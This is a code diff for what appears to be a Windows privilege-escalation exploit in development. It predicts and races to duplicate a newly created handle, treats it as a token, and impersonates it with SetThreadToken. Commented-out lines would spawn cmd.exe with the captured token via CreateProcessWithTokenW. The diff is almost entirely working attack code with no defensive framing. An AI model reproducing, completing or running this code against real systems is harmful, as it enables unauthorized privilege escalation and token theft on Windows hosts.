@@ -43,36 +43,67 @@ std::vector<HANDLE> QuerySystemHandlesForObjectTypeAndAccess(DWORD dwObjectType,
 		}
 	}
 
-    return vectHandles;
+	return vectHandles;
 }
 
-HANDLE HandleSearchThread(DWORD64 hBegin, DWORD dwAccessMask) {
-	PUBLIC_OBJECT_BASIC_INFORMATION pobi = { 0 };
-	HANDLE hCurrentProc = (HANDLE)-1;
-	HANDLE hTargetHandle = 0;
-	BOOL bRes = FALSE;
-	NTSTATUS status;
-	// try to search for the handle 10 times, looping over handle values from hBegin to 0x500
-	for (size_t i = 0; i < 100; i++)
-	{
-		for (size_t j = hBegin; j < 0x500; j += 4)
-		{
-			ULONG ulBytesReturned = 0;
-			status = NtQueryObject((HANDLE)j, (OBJECT_INFORMATION_CLASS)0, &pobi, sizeof(PUBLIC_OBJECT_BASIC_INFORMATION), &ulBytesReturned);
 
-			if (!status) {
-				printf("-");
-				bRes = DuplicateHandle(g_hCurrentProc, (HANDLE)j, g_hCurrentProc, &hTargetHandle, 0, 0, DUPLICATE_SAME_ACCESS);
-				if (bRes) {
-					printf("Got Handle - %p - %lx - %lx\n", (HANDLE)j, pobi.Attributes, pobi.GrantedAccess);
-					return hTargetHandle;
-				}
-			}
-			else if(status != 0xC0000008){
-				printf("%llx\n", status);
-			}
+HANDLE FindNextCreatedHandle() {
+	HANDLE highestHandle = 0;
+	UINT32 u32NumHandles = 0;
+	ULONG ulSizeReturned = 0;
+	NTSTATUS status = 0;
+	status = NtQueryInformationProcess((HANDLE)-1, (PROCESSINFOCLASS)ProcessHandleCount, &u32NumHandles, sizeof(UINT32), &ulSizeReturned);
+	if (!NT_SUCCESS(status)) {
+		return (HANDLE)-1;
+	}
+
+	return (HANDLE)((UINT64)++u32NumHandles * 4);
+}
+
+VOID HandleSearchThread(LPVOID lpParam) {
+	HANDLE hToken = INVALID_HANDLE_VALUE;
+	NTSTATUS status = 0;
+	BOOL bRes = FALSE;
+	BOOL b1 = FALSE;
+	// get the next highest handle value
+	HANDLE hTarget = FindNextCreatedHandle();
+	HANDLE hCurrentThread = GetCurrentThread();
+	hTarget = (HANDLE)((UINT64)hTarget + 4);
+	
+	if (!g_NtDuplicateObject) {
+		HMODULE hNtdll = GetModuleHandleA("ntdll");
+		if (!hNtdll) {
+			return;
+		}
+		g_NtDuplicateObject = (lpNtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
+		if (!g_NtDuplicateObject) {
+			return;
 		}
 	}
 
-	return 0;
+	while (!b1) {	
+
+		// try to duplicate
+		b1 = DuplicateHandle(g_hCurrentProc, hTarget, g_hCurrentProc, &hToken, NULL, FALSE, DUPLICATE_SAME_ACCESS);
+		//status = g_NtDuplicateObject(g_hCurrentProc, (HANDLE)((UINT64)hTarget + 4), g_hCurrentProc, &hToken, NULL, FALSE, DUPLICATE_SAME_ACCESS);
+		//printf("%llx:%llx:%x\n", hTarget, (HANDLE)((UINT64)hTarget + 4), status);
+		//printf("%llx:%x:%x\n", hTarget, b1, GetLastError());
+		//b2 = DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hTokenDup);
+		//b1 = OpenProcessToken((HANDLE)((UINT64)hTarget + 4), TOKEN_ALL_ACCESS, &hToken);		
+	}
+	if (b1) {
+		puts("ebin");
+		printf("%llx - target\n", hTarget);
+		printf("%llx - dup\n", hToken);
+		getchar();
+		/*STARTUPINFO startupInfo;
+		PROCESS_INFORMATION processInformation;
+		ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
+		ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
+		bRes = CreateProcessWithTokenW(hToken, NULL, NULL, (LPWSTR)LR"(C:\\Windows\\System32\\cmd.exe)", 0, NULL, NULL, &startupInfo, &processInformation);*/
+		bRes = SetThreadToken(NULL, hToken);
+		if (!bRes) {
+			printf("Failed to SetThreadToken - %x\n", GetLastError());
+		}
+	}
 }
